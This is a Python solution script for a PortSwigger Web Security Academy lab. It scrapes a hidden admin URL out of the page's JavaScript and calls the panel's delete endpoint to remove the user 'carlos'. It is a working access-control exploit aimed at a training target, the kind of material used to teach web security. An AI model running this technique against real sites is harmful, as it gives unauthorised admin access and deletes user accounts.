# Lab: Unprotected admin functionality with unpredictable URL
# https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

import requests
import re
from urllib.parse import urljoin

session = requests.Session()
base_url = "https://ID.web-security-academy.net"
response = session.get(base_url)

# regex to find admin panel in source code
matches = re.findall(r"setAttribute\(['\"]href['\"],\s*['\"](/admin-[\w\-]+)['\"]\)", response.text) 

for path in matches:
    print(f"Potential path: {path}")
    r = session.get(urljoin(base_url, path))
    if "carlos" in r.text:
        print(f"Admin panel found at {path}")
        exploit_url = urljoin(base_url, f"{path}/delete?username=carlos")
        print(exploit_url)
        resp = session.get(exploit_url)
        if "Congratulations" in resp.text:
            print("Lab Solved")
        else:
            print("Exploit did not work")
        break

session.close()

